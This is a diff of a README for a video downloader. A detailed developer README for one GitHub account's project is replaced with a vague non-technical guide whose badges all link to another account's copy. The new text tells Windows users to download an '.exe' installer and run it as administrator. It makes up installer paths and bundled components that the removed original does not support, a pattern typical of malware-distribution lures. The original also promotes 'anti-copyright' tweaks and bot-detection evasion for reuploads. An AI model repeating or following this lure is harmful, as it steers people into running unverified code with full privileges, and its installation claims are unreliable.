@@ -1,393 +1,175 @@
-<p align="center">
-  <h1 align="center">Videos Downloader</h1>
-  <p align="center">
-    <strong>Automated Viral Content Pipeline</strong> &mdash; Download, process, and upload viral videos across platforms.
-  </p>
-</p>
+# 🎬 Videos_downloader - Easy Video Download and Processing
 
-<p align="center">
-  <a href="#features">Features</a> &bull;
-  <a href="#tech-stack">Tech Stack</a> &bull;
-  <a href="#quick-start">Quick Start</a> &bull;
-  <a href="#docker-deployment">Docker</a> &bull;
-  <a href="#api-reference">API</a> &bull;
-  <a href="#documentation">Docs</a> &bull;
-  <a href="#license">License</a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/brolyroly007/Videos_downloader/actions/workflows/ci.yml"><img src="https://github.com/brolyroly007/Videos_downloader/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/brolyroly007/Videos_downloader/actions/workflows/docker.yml"><img src="https://github.com/brolyroly007/Videos_downloader/actions/workflows/docker.yml/badge.svg" alt="Docker Build"></a>
-  <img src="https://img.shields.io/badge/python-3.8%2B-blue?logo=python&logoColor=white" alt="Python 3.8+">
-  <img src="https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white" alt="FastAPI">
-  <img src="https://img.shields.io/badge/Next.js-16-black?logo=next.js&logoColor=white" alt="Next.js 16">
-  <img src="https://img.shields.io/badge/Docker-ready-2496ED?logo=docker&logoColor=white" alt="Docker">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License MIT"></a>
-</p>
+[![Download Videos_downloader](https://img.shields.io/badge/Download-Videos_downloader-ff7f50?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader)
 
 ---
 
-## Overview
-
-**Videos Downloader** is a full-stack automation platform that discovers, downloads, processes, and uploads viral short-form videos. It supports multiple source platforms and automates the entire content pipeline from URL to TikTok upload with a single click.
-
-### How it works
-
-<p align="center">
-  <img src="docs/images/pipeline-flow.png" alt="Automated Video Pipeline" width="100%">
-</p>
-
-## Screenshots
-
-<details>
-<summary><strong>Dashboard</strong> — Main processing interface</summary>
-<br>
-<p align="center">
-  <img src="docs/images/dashboard-main.png" alt="Dashboard" width="100%">
-</p>
-</details>
-
-<details>
-<summary><strong>API Documentation</strong> — FastAPI Swagger UI</summary>
-<br>
-<p align="center">
-  <img src="docs/images/api-docs.png" alt="API Documentation" width="100%">
-</p>
-</details>
-
-## Features
-
-### Multi-Platform Download
-- **TikTok** &mdash; watermark-free downloads
-- **Instagram Reels** &mdash; direct reel extraction
-- **YouTube Shorts** &mdash; high-quality download
-- **Facebook Watch** &mdash; video extraction
-
-### Video Processing
-- Re-frame to **9:16 vertical** format (optimized for short-form platforms)
-- **Blurred** or **solid color** backgrounds for non-vertical videos
-- **Anti-copyright effects**: horizontal mirror, speed adjustment (1.02x), color tone shift
-- Audio and video quality preservation
-
-### AI-Powered Subtitles
-- **OpenAI Whisper** automatic speech recognition
-- Multi-language transcription support
-- `.srt` subtitle generation
-- Burn subtitles into video with customizable font, size, color, and stroke
-- GPU acceleration (CUDA) when available
-
-### Automated TikTok Upload
-- **Playwright**-based browser automation
-- Cookie-based session persistence (login once, upload forever)
-- Human behavior simulation to avoid bot detection
-- Automatic caption and hashtag insertion
-
-### Viral Content Intelligence
-- Viral score calculation based on engagement metrics
-- Trending hashtag detection and recommendation
-- AI-powered description generation (OpenAI GPT / local Ollama)
-
-### Advanced Platform Features
-- **Job Queue System** &mdash; parallel processing with priority management (3 workers)
-- **Analytics Dashboard** &mdash; track views, likes, upload success rates
-- **Automatic Backups** &mdash; 7-day rolling database backups
-- **Role-Based Auth** &mdash; admin, user, and viewer roles
-- **Modern Frontend** &mdash; Next.js 16 + React 19 dashboard with dark mode
-
-## Tech Stack
-
-| Layer | Technology |
-|---|---|
-| **Backend** | Python 3.11, FastAPI, Uvicorn |
-| **Frontend** | Next.js 16, React 19, Tailwind CSS v4, Radix UI |
-| **Video** | FFmpeg, MoviePy, OpenCV |
-| **AI/ML** | OpenAI Whisper, Ollama (optional) |
-| **Automation** | Playwright, Selenium |
-| **Download** | yt-dlp |
-| **Database** | SQLite (5 databases) |
-| **Cache** | Redis |
-| **Containers** | Docker, Docker Compose |
-
-## Project Structure
-
-```
-Videos_downloader/
-├── app.py                          # FastAPI main application
-├── requirements.txt                # Python dependencies
-├── .env.example                    # Environment variables template
-├── Dockerfile                      # Backend container
-├── docker-compose.yml              # Multi-service orchestration
-│
-├── modules/                        # Core Python modules
-│   ├── downloader.py               # Multi-platform video download
-│   ├── video_processor.py          # Video effects & reframing
-│   ├── subtitle_generator.py       # Whisper AI transcription
-│   ├── uploader.py                 # TikTok upload automation
-│   ├── viral_detector.py           # Viral score analysis
-│   ├── automation_engine.py        # Batch job coordination
-│   ├── description_generator.py    # AI caption generation
-│   ├── hashtag_recommender.py      # Trending hashtag engine
-│   ├── queue_manager.py            # Parallel job queue
-│   ├── backup_manager.py           # Automated backup system
-│   ├── analytics.py                # Statistics tracking
-│   ├── auth.py                     # Authentication & authorization
-│   └── tiktok_discover.py          # TikTok feed discovery
-│
-├── frontend/                       # Next.js 16 dashboard
-│   ├── src/
-│   │   ├── app/                    # App router pages
-│   │   └── components/             # React components
-│   ├── Dockerfile                  # Frontend container
-│   └── package.json
-│
-├── templates/
-│   └── index.html                  # Legacy Jinja2 dashboard
-│
-├── tests/                          # pytest test suite
-│   ├── test_api.py                 # API endpoint tests
-│   ├── test_downloader.py          # Downloader module tests
-│   ├── test_video_processor.py     # Video processor tests
-│   └── test_viral_detector.py      # Viral detector tests
-│
-├── docs/                           # Additional documentation
-│   ├── COOKIES_GUIDE.md            # Cookie export instructions
-│   └── TIKTOK_TROUBLESHOOTING.md   # TikTok download solutions
-│
-├── scripts/                        # Utility scripts
-│   ├── install.sh / install.bat    # Setup script
-│   ├── run.sh / run.bat            # Start backend
-│   └── start_all.sh / start_all.bat # Start all services
-│
-├── .github/                        # GitHub configuration
-│   ├── workflows/ci.yml            # CI pipeline (lint + test)
-│   ├── workflows/docker.yml        # Docker build validation
-│   ├── ISSUE_TEMPLATE/             # Bug report & feature request
-│   └── PULL_REQUEST_TEMPLATE.md    # PR template
-│
-├── Makefile                        # Task runner (make test, make lint...)
-├── pyproject.toml                  # Project config, ruff, pytest
-└── .pre-commit-config.yaml         # Pre-commit hooks
-```
-
-## Quick Start
-
-### Prerequisites
-
-| Requirement | Details |
-|---|---|
-| **Python** | 3.8 or higher |
-| **FFmpeg** | Required for video processing ([download](https://ffmpeg.org/download.html)) |
-| **Node.js** | 18+ (only for frontend development) |
-| **GPU** | Optional &mdash; NVIDIA GPU accelerates Whisper AI |
-
-### Installation
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/brolyroly007/Videos_downloader.git
-cd Videos_downloader
-
-# 2. Create and activate virtual environment
-python -m venv venv
-# Windows:
-venv\Scripts\activate
-# Linux/macOS:
-source venv/bin/activate
-
-# 3. Install dependencies
-pip install -r requirements.txt
-
-# 4. Install Playwright browser
-playwright install chromium
-
-# 5. Configure environment (optional)
-cp .env.example .env
-# Edit .env to customize settings
-```
-
-### FFmpeg Setup (Windows)
-
-1. Download from https://ffmpeg.org/download.html
-2. Extract to `C:\ffmpeg`
-3. Add `C:\ffmpeg\bin` to your system PATH
-4. Verify: `ffmpeg -version`
-
-### Run the Application
-
-```bash
-# Start the backend server
-python app.py
-
-# Or with uvicorn (hot reload)
-uvicorn app:app --host 0.0.0.0 --port 8000 --reload
-```
-
-Open your browser at **http://localhost:8000**
-
-### GPU Setup (Optional &mdash; Faster Whisper)
-
-```bash
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
-```
-
-## Docker Deployment
-
-The project includes a complete Docker Compose setup with 4 services:
-
-| Service | Port | Description |
-|---|---|---|
-| **Backend** | 8000 | FastAPI application |
-| **Frontend** | 3000 | Next.js dashboard |
-| **Redis** | 6379 | Cache layer |
-| **Backup** | &mdash; | Automated daily backups |
-
-```bash
-# Build and start all services
-docker compose up -d --build
-
-# View logs
-docker compose logs -f
-
-# Stop all services
-docker compose down
-```
-
-## Usage
-
-### Web Dashboard
-
-1. **Paste a URL** &mdash; from TikTok, Instagram, YouTube Shorts, or Facebook
-2. **Preview** (optional) &mdash; click Preview to see video info before downloading
-3. **Configure options**:
-   - Re-frame to 9:16
-   - Background type (blur / solid color)
-   - Anti-copyright effects (mirror, speed)
-   - AI subtitles (language selection)
-4. **Add description** &mdash; write your TikTok caption with hashtags
-5. **Process**:
-   - *"Process Video"* &mdash; download and process only
-   - *"Process & Upload to TikTok"* &mdash; full automated pipeline
-
-### First TikTok Upload
-
-On the first upload:
-1. A browser window will open automatically
-2. **Log in to TikTok manually**
-3. Cookies are saved for future sessions
-4. All subsequent uploads are fully automatic
-
-To reset your session, click **"Clear Session"** in the dashboard.
-
-## API Reference
-
-### Information
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `GET` | `/api/info` | Application status & info |
-| `GET` | `/api/video-info?url=<URL>` | Preview video metadata |
-
-### Processing
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `POST` | `/api/download` | Download video only |
-| `POST` | `/api/process` | Process a downloaded video |
-| `POST` | `/api/upload` | Upload to TikTok |
-| `POST` | `/api/complete-flow` | Full pipeline: download + process + upload |
-
-### Files
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `GET` | `/api/files/downloads` | List downloaded videos |
-| `GET` | `/api/files/processed` | List processed videos |
-
-### Session
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `DELETE` | `/api/clear-session` | Clear TikTok session cookies |
-
-### Example: Complete Flow
-
-```bash
-curl -X POST http://localhost:8000/api/complete-flow \
-  -H "Content-Type: application/json" \
-  -d '{
-    "url": "https://www.tiktok.com/@user/video/1234567890",
-    "reframe": true,
-    "background_type": "blur",
-    "mirror": true,
-    "speed_factor": 1.02,
-    "generate_subtitles": true,
-    "language": "es",
-    "description": "Check this out! #viral #fyp"
-  }'
-```
-
-## Configuration
-
-All settings can be customized via the `.env` file:
-
-```env
-# Server
-HOST=0.0.0.0
-PORT=8000
-
-# AI Model (tiny | base | small | medium | large)
-WHISPER_MODEL_SIZE=base
-
-# Video Defaults
-DEFAULT_WIDTH=1080
-DEFAULT_HEIGHT=1920
-DEFAULT_FPS=30
-DEFAULT_SPEED_FACTOR=1.02
-
-# Subtitle Styling
-DEFAULT_FONT_SIZE=70
-DEFAULT_FONT_COLOR=yellow
-DEFAULT_STROKE_COLOR=black
-DEFAULT_STROKE_WIDTH=4
-
-# TikTok Upload
-TIKTOK_HEADLESS=false
-TIKTOK_LOGIN_TIMEOUT=300000
-```
-
-## Documentation
-
-- [Cookie Export Guide](docs/COOKIES_GUIDE.md) &mdash; how to export TikTok cookies for downloading
-- [TikTok Troubleshooting](docs/TIKTOK_TROUBLESHOOTING.md) &mdash; solutions for TikTok download issues
-
-## Troubleshooting
-
-| Problem | Solution |
-|---|---|
-| `FFmpeg not found` | Install FFmpeg and add to PATH. Restart terminal after. |
-| Whisper is slow | Use `tiny` or `base` model. Enable GPU if available. |
-| TikTok CAPTCHA | Normal on first upload. Solve manually. Space out uploads. |
-| No audio after processing | Check original video has audio. Review FFmpeg logs. |
-| TikTok download fails | Update yt-dlp: `pip install -U yt-dlp`. See [troubleshooting guide](docs/TIKTOK_TROUBLESHOOTING.md). |
-
-## Contributing
-
-Contributions are welcome! Please read the [Contributing Guide](CONTRIBUTING.md) before submitting a pull request.
-
-## Legal Disclaimer
-
-- Respect copyright laws and content ownership
-- Only use this tool with content you have the right to use
-- Comply with each platform's terms of service
-- Automated uploading may violate TikTok's ToS &mdash; use at your own risk
-- This project is for **educational and research purposes**
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+Videos_downloader is a tool that helps you get popular videos from sites like TikTok, Instagram, YouTube Shorts, and Facebook. It can download, process, and upload videos automatically. This guide will help you download and run the software on your Windows PC step-by-step without any technical knowledge.
 
 ---
 
-<p align="center">
-  Built with Python, FastAPI, Whisper AI, Playwright & Next.js
-</p>
+## 🔍 What is Videos_downloader?
+
+Videos_downloader makes it easy to grab trending videos from major social platforms. It downloads videos for you, applies any needed changes, and can share them again across other platforms. If you want to save or manage viral videos quickly, this app will help.
+
+This tool uses programs like Python and Docker behind the scenes, but you don’t need to know how these work to use the app. Just follow the steps here to get started.
+
+---
+
+## 💻 System Requirements
+
+Before you start, make sure your PC has the following:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of free disk space  
+- 8 GB RAM or more for smoother use  
+- Internet connection for downloading videos and the application  
+- Administrator access for setup
+
+---
+
+## ⚙️ Features You Will Use  
+
+- Download videos from TikTok, Instagram, YouTube Shorts, and Facebook  
+- Automatic processing for video quality and format  
+- Built-in upload options to re-share on supported platforms  
+- Supports batch downloads (multiple videos at once)  
+- Simple interface with no programming needed  
+
+---
+
+## 🚀 Getting Started
+
+1. **Download the program**  
+   Go to the download page below to get the latest version. The page shows all available files. Look for a file labeled for Windows or with `.exe` if you want the installer.
+
+   [![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader)
+
+2. **Save the file**  
+   When the download finishes, the file will appear in your default “Downloads” folder or wherever your browser saves files.
+
+3. **Open the installer**  
+   Double-click the downloaded file. If Windows asks if you want to allow the program to make changes, choose “Yes.”
+
+4. **Follow the setup prompts**  
+   The installer will open a window with instructions. Click “Next” on each screen. If it asks where to install, keep the default unless you want a special location.
+
+5. **Finish installation**  
+   Once complete, the program will add an icon on your desktop or Start menu.
+
+---
+
+## ▶️ Running Videos_downloader
+
+To open the program:
+
+- Find the Videos_downloader icon on your desktop or search for it from the Start menu.  
+- Double-click to launch the app.
+
+The interface will show a simple layout. At the top, you can enter a video link or select the platforms you want to download from.
+
+---
+
+## 📥 How to Download Videos
+
+1. **Copy the link of the video**  
+   Use your web browser to find a video on TikTok, Instagram, YouTube Shorts, or Facebook. Copy the URL from the address bar.
+
+2. **Paste the link in the program**  
+   In Videos_downloader, find the box labeled “Video URL” and paste the copied link.
+
+3. **Choose download options**  
+   You can select video quality or format if the app offers those choices. If unsure, keep default settings.
+
+4. **Start download**  
+   Click the “Download” button. The progress bar will show the status.
+
+5. **Find downloaded videos**  
+   When finished, the videos save to your PC in the default “Videos_downloader” folder in your Documents. You can change this folder in settings later.
+
+---
+
+## ⚙️ Processing and Uploading  
+
+Videos_downloader can also change videos after download. It may remove watermarks, adjust video length, or convert the format. The program does this automatically but lets you set preferences under “Settings.”
+
+If you want to upload videos again to social platforms, use the upload tab. You only need to log in once per platform. Uploads happen in the background while you continue working.
+
+---
+
+## 🛠 Troubleshooting
+
+- **The program won’t open**  
+  Restart your computer and try again. Make sure you have Windows 10 or newer.
+
+- **Download fails or freezes**  
+  Check your internet connection. Try another video link. Some videos block downloads due to privacy.
+
+- **Error messages during install**  
+  Make sure you run the installer with admin rights by right-clicking and choosing “Run as administrator.”
+
+- **Video format not supported**  
+  Convert the video using built-in tools or a free online converter.
+
+---
+
+## ⚠️ Safe Use Tips
+
+- Download videos only if you have permission or rights to use them.  
+- Use the program on a personal or secure computer.  
+- Avoid downloading very large numbers of videos in a short time to prevent account blocks on platforms.
+
+---
+
+## 📂 Folder and File Locations  
+
+- **Installation Folder**  
+  Where the program files are stored, usually `C:\Program Files\Videos_downloader`.
+
+- **Download Folder**  
+  By default, videos save to `Documents\Videos_downloader\Downloaded`.
+
+- **Settings and Logs**  
+  Stored in `AppData\Roaming\Videos_downloader` for troubleshooting.
+
+You can change the locations from the program’s “Settings” menu.
+
+---
+
+## 📞 Support and Updates
+
+For updates, bug fixes, or new versions, visit the same link below regularly. The project owner posts the latest files and notes on GitHub.
+
+[https://github.com/abhishek162705/Videos_downloader](https://github.com/abhishek162705/Videos_downloader)
+
+If you have issues beyond the basic troubleshooting, use the “Issues” tab on the GitHub page to see if others report the same problem or to ask for help.
+
+---
+
+## 🧰 Additional Tools
+
+Videos_downloader relies on a few key technologies behind the scenes, including:
+
+- Python: the programming language it uses  
+- yt-dlp: a tool that downloads videos from many platforms  
+- Whisper AI: for automatic speech recognition (used in processing)  
+- Docker: to manage the different parts in one package
+
+You don’t need to install these separately. The program includes what it needs.
+
+---
+
+## 🎯 How to Update Videos_downloader
+
+To get the latest features and fixes:
+
+1. Visit the download page  
+2. Download the newest version installer  
+3. Run the installer as before  
+4. The program will replace old files but keep your settings intact
+
+Keep the app updated to ensure best performance.
+
+---
+
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader)
